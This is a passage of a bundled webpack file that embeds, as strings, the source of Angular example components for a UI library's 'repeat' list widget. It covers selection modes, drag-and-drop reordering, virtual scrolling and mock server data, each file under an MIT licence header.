MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\nimport { IItemsReorderedEvent } from "@nova-ui/bits";\n\ninterface ISortingOrderTrimmedData\n    extends Omit<IItemsReorderedEvent, "item" | "dropListRef"> {}\n\n@Component({\n    selector: "nui-repeat-reorder-simple-example",\n    templateUrl: "./repeat-reorder-simple-example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class RepeatReorderSimpleExampleComponent {\n    public companies: string[] = ["Adobe", "IBM", "Dell", "Microsoft"];\n\n    public draggable: boolean = true;\n    public reorderable: boolean = true;\n    public droppedEventData: ISortingOrderTrimmedData;\n\n    public onItemsReordered(event: IItemsReorderedEvent<string>): void {\n        // update items according to the new order\n        this.companies = event.currentState;\n\n        // copy all event proprieties except the CdkDrag & CdkDropList references\n        const { item, dropListRef, ...rest } = event;\n        this.droppedEventData = rest;\n    }\n}\n'},15854:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n\n<div class="example">\n    <nui-repeat\n        [itemsSource]="colors"\n        [repeatItemTemplateRef]="repeatItemTemplate"\n    >\n    </nui-repeat>\n</div>\n'},27050:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-simple-example",\n    templateUrl: "./repeat-simple.example.component.html",\n})\nexport class RepeatSimpleExampleComponent {\n    public colors = [\n        { color: $localize`blue` },\n        { color: $localize`green` },\n        { color: $localize`yellow` },\n        { color: $localize`cyan` },\n        { color: $localize`magenta` },\n        { color: $localize`black` },\n    ];\n\n    constructor() {}\n}\n'},50394:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="example single-selection-example">\n    <p>\n        <span i18n>Selection:</span>\n        <span id="nui-demo-singleselect-value">{{\n            selectedPeople | json\n        }}</span>\n    </p>\n    <p>\n        <nui-switch [(value)]="preventRowClick">prevent row click</nui-switch>\n    </p>\n    <nui-repeat\n        id="nui-demo-single-repeat"\n        [itemsSource]="people"\n        [selection]="selectedPeople"\n        selectionMode="single"\n        [preventRowClick]="preventRowClick"\n        (selectionChange)="selectedPeople = $event"\n        [repeatItemTemplateRef]="repeatPeopleItemTemplate"\n    >\n    </nui-repeat>\n</div>\n\n<ng-template #repeatPeopleItemTemplate let-item="item">\n    <nui-icon class="flex-row-item" icon="user"></nui-icon>\n    <div class="flex-row-item flex-column-container">\n        <div class="name-item">{{ item.name }}</div>\n        <div [ngClass]="item.level">{{ item.level }}</div>\n        <div class="status-item">{{ item.status }}</div>\n    </div>\n</ng-template>\n'},24710:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-single-selection-mode-example",\n    templateUrl: "./repeat-single-selection-mode.example.component.html",\n    styleUrls: ["./repeat-single-selection-mode.example.less"],\n})\nexport class RepeatSingleSelectionModeExampleComponent {\n    public people = [\n        {\n            name: "Jo Smith",\n            level: $localize`bronze`,\n            status: $localize`active`,\n        },\n        {\n            name: "Claire Rogan",\n            level: $localize`gold`,\n            status: $localize`active`,\n            disabled: true,\n        },\n        {\n            name: "Declan McGregor",\n            level: $localize`platinum`,\n            status: $localize`active`,\n        },\n        {\n            name: "Fergus O\'Brien",\n            level: $localize`bronze`,\n            status: $localize`inactive`,\n        },\n        {\n            name: "Catriona Kildare",\n            level: $localize`gold`,\n            status: $localize`active`,\n        },\n    ];\n\n    public preventRowClick = false;\n    public selectedPeople = [this.people[2]];\n}\n'},43403:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n.single-selection-example {\n    .blue {\n        background-color: #0000ff;\n    }\n\n    .green {\n        background-color: #009900;\n    }\n\n    .yellow {\n        background-color: #ffff00;\n    }\n\n    .orange {\n        background-color: #ff6600;\n    }\n\n    .cyan {\n        background-color: #00ffff;\n    }\n\n    .magenta {\n        background-color: #ff00ff;\n    }\n\n    .black {\n        background-color: #000000;\n    }\n\n    .flex-row-container {\n        display: flex;\n    }\n\n    .flex-row-item {\n        margin: 0 5px;\n    }\n    nui-icon.flex-row-item {\n        align-self: flex-start;\n        margin-top: @nui-space-xs;\n    }\n\n    .flex-row-item:first-child {\n        margin-left: 0;\n    }\n\n    .flex-independent-row-item {\n        margin: 15px 5px;\n    }\n\n    .flex-column-container {\n        display: flex;\n        flex-direction: column;\n    }\n\n    .name-item {\n        font-size: 12px;\n        font-weight: bold;\n    }\n\n    .status-item {\n        font-size: 10px;\n        .setCssVariable(color, nui-color-text-secondary);\n    }\n\n    .gold {\n        font-size: 10px;\n        font-weight: bold;\n        .setCssVariable(color, nui-color-brand-four);\n    }\n\n    .platinum {\n        font-size: 10px;\n        font-weight: bold;\n        .setCssVariable(color, nui-color-brand-seven);\n    }\n\n    .bronze {\n        font-size: 10px;\n        font-weight: bold;\n        .setCssVariable(color, nui-color-brand);\n    }\n}\n'},10724:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="example">\n    <p>\n        <span i18n>Selection:</span>\n        <span>{{ selectedColors | json }}</span>\n    </p>\n    <p>\n        <nui-switch [(value)]="preventRowClick">prevent row click</nui-switch>\n    </p>\n    <nui-repeat\n        #repeat\n        [itemsSource]="colors"\n        [selection]="selectedColors"\n        selectionMode="singleWithRequiredSelection"\n        [preventRowClick]="preventRowClick"\n        (selectionChange)="selectedColors = $event"\n        [repeatItemTemplateRef]="repeatItemTemplate"\n    ></nui-repeat>\n</div>\n\n<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n'},97988:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-single-with-required-selection-mode-example",\n    templateUrl:\n        "./repeat-single-with-required-selection-mode.example.component.html",\n})\nexport class RepeatSingleWithRequiredSelectionModeExampleComponent {\n    public colors = [\n        { color: $localize`blue` },\n        { color: $localize`green` },\n        { color: $localize`yellow` },\n        { color: $localize`cyan` },\n        { color: $localize`magenta` },\n        { color: $localize`black` },\n    ];\n\n    public preventRowClick = false;\n    public selectedColors = [this.colors[1]];\n}\n'},38682:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-tab-heading-group\n    id="repeat-test-tab-group"\n    (selected)="currentTabId = $event"\n>\n    <nui-tab-heading\n        *ngFor="let tab of tabs"\n        [tabId]="tab.id"\n        [active]="currentTabId === tab.id"\n        >{{ tab.title }}</nui-tab-heading\n    >\n</nui-tab-heading-group>\n<div [style.display]="getTabDisplayMode(tabs[0].id)">\n    No content in this tab. See other tab(s) for content.\n</div>\n<div [style.display]="getTabDisplayMode(tabs[1].id)">\n    <repeat-virtual-scroll id="repeat-test-vscroll"></repeat-virtual-scroll>\n</div>\n<hr />\n<nui-repeat-multi-selection-example></nui-repeat-multi-selection-example>\n<nui-repeat-disabled-multi-selection-example></nui-repeat-disabled-multi-selection-example>\n<nui-repeat-single-selection-mode-example></nui-repeat-single-selection-mode-example>\n<button nui-button type="button" id="add-color" (click)="addNewColor()">\n    Add color\n</button>\n<nui-repeat-radio-selection-mode-example\n    [colors]="colors"\n></nui-repeat-radio-selection-mode-example>\n<nui-repeat-radio-with-non-required-selection-mode-example></nui-repeat-radio-with-non-required-selection-mode-example>\n<nui-repeat-single-with-required-selection-mode-example></nui-repeat-single-with-required-selection-mode-example>\n'},46630:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-test",\n    templateUrl: "./repeat-test.component.html",\n})\nexport class RepeatTestComponent {\n    public colors = [\n        { color: $localize`blue` },\n        { color: $localize`green` },\n        { color: $localize`yellow` },\n        { color: $localize`cyan` },\n        { color: $localize`magenta` },\n        { color: $localize`black` },\n    ];\n\n    public readonly tabs = [\n        {\n            id: "tab1",\n            title: "No Content",\n        },\n        {\n            id: "tab2",\n            title: "Repeat VScroll",\n        },\n    ];\n\n    public currentTabId: string = this.tabs[0].id;\n\n    private colorIndex: number = 1;\n\n    public addNewColor(): void {\n        this.colors.push({ color: `new color ${this.colorIndex++}` });\n    }\n\n    // using css display rule instead of *ngIf to test RepeatComponent\'s IntersectionObserver\n    // (*ngIf would instantiate the test component only when the tab is selected instead of immediately on page load)\n    public getTabDisplayMode = (tabId: string): string =>\n        this.currentTabId === tabId ? "block" : "none";\n}\n'},85140:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Injectable } from "@angular/core";\nimport { firstValueFrom, Observable, of } from "rxjs";\nimport { map } from "rxjs/operators";\n\nimport {\n    IDataSource,\n    INovaFilteringOutputs,\n    ServerSideDataSource,\n} from "@nova-ui/bits";\n\nimport { DATA } from "./repeat-virtual-scroll-data";\nimport { IServerFilters, IServersCollection } from "./types";\n\n@Injectable()\nexport class RepeatVirtualScrollDataSource<T>\n    extends ServerSideDataSource<T>\n    implements IDataSource\n{\n    public async getFilteredData(\n        data: IServersCollection\n    ): Promise<INovaFilteringOutputs> {\n        return firstValueFrom(\n            of(data).pipe(\n                map((response: IServersCollection) => {\n                    const itemsSource = response.items;\n\n                    return {\n                        repeat: { itemsSource },\n                    };\n                })\n            )\n        );\n    }\n\n    protected getBackendData(\n        filters: IServerFilters\n    ): Observable<IServersCollection> {\n        return of({\n            items:\n                DATA?.map((item) => ({\n                    name: item.name,\n                    location: item.location,\n                    status: item.status,\n                })) || [],\n        });\n    }\n}\n'},21724:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport const RESULTS_PER_PAGE = 20;\n\nexport const DATA = [\n    { location: "New Jermaine", name: "TURCO-SVR-ET9695", status: "Down" },\n    { location: "Kyiv", name: "DAUGH-LT-SED9492", status: "Active" },\n    { location: "Archton", name: "GLOVE-LT-QUI9554", status: "Active" },\n    { location: "South Levi", name: "HIRTH-LT-MOLE9968", status: "Active" },\n    { location: "Austin", name: "KUB-LT-ODIO9015", status: "Active" },\n    { location: "Taylormouth", name: "MAYER-SVR-DOLO9518", status: "Down" },\n    { location: "Brno", name: "BORER-LT-OCCA9986", status: "Active" },\n    { location: "North Bert", name: "ERNSE-SVR-EARU9344", status: "Down" },\n    { location: "Kuhlmanhaven", name: "HELLE-LT-QUIA9115", status: "Active" },\n    { location: "Austin", name: "BROWN-SVR-EUM9158", status: "Active" },\n    {\n        location: "East Keatonborough",\n        name: "VEUM-LT-EXER9236",\n        status: "Active",\n    },\n    { location: "Lake Kailee", name: "WINDL-LT-QUI9139", status: "Active" },\n    { location: "New Haydenhaven", name: "ONDRI-SVR-REIC9243", status: "Down" },\n    {\n        location: "Esmeraldaborough",\n        name: "SHANA-SVR-NEQU9387",\n        status: "Down",\n    },\n    { location: "O\'Reillyton", name: "HERMA-LT-VITA9273", status: "Down" },\n    { location: "Bucharest", name: "D\'AMO-SVR-DOLO9199", status: "Down" },\n    { location: "New Ilafort", name: "CUMME-SVR-IPSU9949", status: "Active" },\n    { location: "Bucharest", name: "O\'CON-LT-DELE9341", status: "Active" },\n    { location: "Austin", name: "HESSE-LT-ET9816", status: "Down" },\n    { location: "Declanburgh", name: "LAKIN-SVR-NON9503", status: "Active" },\n    { location: "Dorrismouth", name: "ZBONC-SVR-MAXI9692", status: "Active" },\n    { location: "Nitzscheton", name: "FADEL-SVR-ASSU9183", status: "Active" },\n    { location: "North Arielmouth", name: "WATSI-LT-QUIA9919", status: "Down" },\n    { location: "Austin", name: "CONRO-LT-ET9222", status: "Active" },\n    { location: "Kyiv", name: "HUELS-LT-TEMP9463", status: "Down" },\n    { location: "Gulgowskiside", name: "ANDER-LT-ET9545", status: "Down" },\n    { location: "West Estashire", name: "BRAUN-LT-BEAT9513", status: "Active" },\n    { location: "Lailaland", name: "JASKO-SVR-NATU9644", status: "Active" },\n    { location: "South Luigi", name: "SIMON-LT-VOLU9900", status: "Down" },\n    { location: "Bogisichtown", name: "HERMI-SVR-TEMP9404", status: "Active" },\n    { location: "Kyiv", name: "RATKE-SVR-EST9459", status: "Active" },\n    { location: "Corkeryport", name: "REICH-LT-ET9322", status: "Active" },\n    {\n        location: "South Katarinaview",\n        name: "TOWNE-SVR-QUIB9469",\n        status: "Down",\n    },\n];\n'},79990:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex flex-row">\n    <nui-repeat\n        class="app-virtual-scroll-list-repeat"\n        selectionMode="none"\n        [itemConfig]="itemConfig"\n        [repeatItemTemplateRef]="listRepeatItemTemplate"\n        [selection]="filteringState.repeat?.selectedItems"\n        [itemsSource]="listItems$ | async"\n        [virtualScroll]="true"\n        [itemSize]="30"\n    >\n    </nui-repeat>\n</div>\n\n<ng-template #listRepeatItemTemplate let-item="item">\n    <div class="container">\n        <div class="row">\n            <div *ngFor="let field of item | keyvalue" class="col-sm">\n                {{ field.value }}\n            </div>\n        </div>\n    </div>\n</ng-template>\n'},55110:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n\n:host {\n    .app-virtual-scroll-list-repeat {\n        margin: @nui-space-sm @nui-space-md;\n        width: 100%;\n        // it is very important to have a height for virtual scroll\n        height: 300px;\n    }\n}\n'},84194:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    Inject,\n    OnDestroy,\n    OnInit,\n    ViewChild,\n} from "@angular/core";\nimport { BehaviorSubject, Subject } from "rxjs";\n// eslint-disable-next-line import/no-deprecated\nimport { filter, switchMap, takeUntil, tap } from "rxjs/operators";\n\nimport {\n    DataSourceService,\n    IFilteringOutputs,\n    INovaFilteringOutputs,\n    IRepeatItemConfig,\n    RepeatComponent,\n    VirtualViewportManager,\n} from "@nova-ui/bits";\n\nimport { RESULTS_PER_PAGE } from "./repeat-virtual-scroll-data";\nimport { RepeatVirtualScrollDataSource } from "./repeat-virtual-scroll-data-source";\nimport { IServer } from "./types";\n\n@Component({\n    selector: "repeat-virtual-scroll",\n    templateUrl: "./repeat-virtual-scroll.component.html",\n    styleUrls: ["./repeat-virtual-scroll.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    providers: [\n        VirtualViewportManager,\n        {\n            provide: DataSourceService,\n            useClass: RepeatVirtualScrollDataSource,\n        },\n    ],\n})\nexport class RepeatVirtualScrollComponent\n    implements OnInit, AfterViewInit, OnDestroy\n{\n    public listItems$ = new BehaviorSubject<IServer[]>([]);\n\n    public filteringState: INovaFilteringOutputs = {};\n    public isBusy = false;\n\n    public totalItems: number = 0;\n\n    public itemConfig: IRepeatItemConfig<IServer> = {\n        trackBy: (_, item): string | undefined => item?.name,\n    };\n\n    @ViewChild(RepeatComponent) repeat: RepeatComponent;\n\n    private readonly destroy$ = new Subject<void>();\n\n    constructor(\n        @Inject(DataSourceService)\n        private dataSource: RepeatVirtualScrollDataSource<IServer>,\n        private changeDetection: ChangeDetectorRef,\n        private viewportManager: VirtualViewportManager\n    ) {}\n\n    public ngOnInit(): void {\n        this.dataSource.busy\n            .pipe(\n                tap((val) => {\n                    this.isBusy = val;\n                    this.changeDetection.detectChanges();\n                }),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n\n    public async ngAfterViewInit(): Promise<void> {\n        this.dataSource.registerComponent({\n            virtualScroll: { componentInstance: this.viewportManager },\n            repeat: { componentInstance: this.repeat },\n        });\n\n        this.viewportManager\n            // Note: Initializing viewportManager with the repeat\'s CDK Viewport Ref\n            .setViewport(this.repeat.viewportRef)\n\n            // Note: Initializing the stream with the desired page size, based on which\n            // ViewportManager will perform the observations and will emit\n            // distinct ranges with step equal to provided pageSize\n            .observeNextPage$({ pageSize: RESULTS_PER_PAGE })\n            .pipe(\n                // Since we know the total number of items we can stop the stream when dataset end is reached\n                // Otherwise we can let VirtualViewportManager to stop when last received page range will not match requested range\n                filter(() => {\n                    const items = this.listItems$.getValue();\n                    return !items.length || items.length < this.totalItems;\n                }),\n                tap(async () => this.applyFilters(false)),\n                // Note: Using the same stream to subscribe to the outputsSubject and update the items list\n                // eslint-disable-next-line import/no-deprecated\n                switchMap(() =>\n                    this.dataSource.outputsSubject.pipe(\n                        tap((data: IFilteringOutputs) => {\n                            // update the list of items to be rendered\n                            const items = data.repeat?.itemsSource || [];\n                            this.totalItems = data.repeat?.itemsSource.length;\n\n                            // after receiving data we need to append it to our previous fetched results\n                            this.listItems$.next(\n                                this.listItems$.getValue().concat(items)\n                            );\n                            this.changeDetection.detectChanges();\n                        })\n                    )\n                ),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n\n    public ngOnDestroy(): void {\n        this.destroy$.next();\n        this.destroy$.complete();\n    }\n\n    public async applyFilters(\n        resetVirtualScroll: boolean = true\n    ): Promise<void> {\n        if (resetVirtualScroll) {\n            // it is important to reset viewportManager to start page\n            // so that the data source performs the search with 1st page\n            this.viewportManager.reset({ emitFirstPage: false });\n        }\n\n        // Every new search request or filter change should\n        // clear the cache in order to correctly display a new set of data\n        const filters = this.dataSource.getFilters();\n        const reset = this.dataSource.computeFiltersChange(filters);\n        if (reset || filters.virtualScroll?.value.start === 0) {\n            this.listItems$.next([]);\n            this.changeDetection.detectChanges();\n        }\n\n        await this.dataSource.applyFilters();\n    }\n}\n'},29219:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { IFilter, INovaFilters } from "@nova-ui/bits";\n\n// main server model being received from the backend\nexport interface IServer {\n    location: string;\n    name: string;\n    status: string;\n}\n\n// implement custom filters\nexport interface IServerFilters extends INovaFilters {\n    location?: IFilter<string>;\n    name?: IFilter<string>;\n    status?: IFilter<string>;\n}\n\n// collection of items that we\'ve transformed from the backend API\nexport interface IServersCollection {\n    items: IServer[];\n}\n'},74298:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Multiple Selection Mode with Disabled Items</h3>\n    <nui-repeat-disabled-multi-selection-example\n        id="nui-demo-multi-disabled-items"\n    ></nui-repeat-disabled-multi-selection-example>\n    <hr />\n\n    <h3>Multiple Selection Mode Repeating Header from Template</h3>\n    <nui-repeat-multi-selection-example\n        id="nui-demo-multi-repeat-items"\n    ></nui-repeat-multi-selection-example>\n    <hr />\n\n    <h3>Single Selection Mode with Item Highlight</h3>\n    <nui-repeat-single-selection-mode-example\n        id="nui-demo-single-highlight"\n    ></nui-repeat-single-selection-mode-example>\n    <hr />\n\n    <h3>Single Selection Mode with Radio Buttons</h3>\n    <nui-repeat-radio-selection-mode-example\n        id="nui-demo-radio-selection"\n    ></nui-repeat-radio-selection-mode-example>\n    <hr />\n\n    <h3>Required Single Selection Mode</h3>\n    <nui-repeat-single-with-required-selection-mode-example\n        id="nui-demo-single-required-selection"\n    ></nui-repeat-single-with-required-selection-mode-example>\n    <hr />\n\n    <h3>Non-Required Selection Mode with Radio Buttons</h3>\n    <nui-repeat-radio-with-non-required-selection-mode-example\n        id="nui-demo-radio-non-required-selection"\n    ></nui-repeat-radio-with-non-required-selection-mode-example>\n    <hr />\n\n    <h3>Item-Specific Drag/Drop Behavior</h3>\n    <nui-repeat-reorder-config-example\n        id="nui-demo-reorder-config"\n    ></nui-repeat-reorder-config-example>\n</div>\n'},10534:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  